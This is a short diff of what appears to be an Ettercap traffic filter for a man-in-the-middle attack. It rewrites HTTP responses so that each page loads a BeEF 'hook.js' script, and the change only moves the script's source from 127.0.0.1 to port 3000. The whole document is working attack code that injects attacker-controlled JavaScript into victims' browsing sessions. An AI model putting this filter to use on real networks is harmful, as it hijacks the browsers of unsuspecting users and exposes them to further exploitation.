@@ -6,6 +6,6 @@ if (ip.proto == TCP && tcp.dst == 80) {
 
 if (ip.proto == TCP && tcp.src == 80) {
  if (search(DATA.data, "</head>")) {
-           replace("</head>", "<script language=javascript src=http://127.0.0.1/hook.js></script></head>");
+           replace("</head>", "<script language=javascript src=http://127.0.0.1:3000/hook.js></script></head>");
            msg("beef agent injected...");
 }}
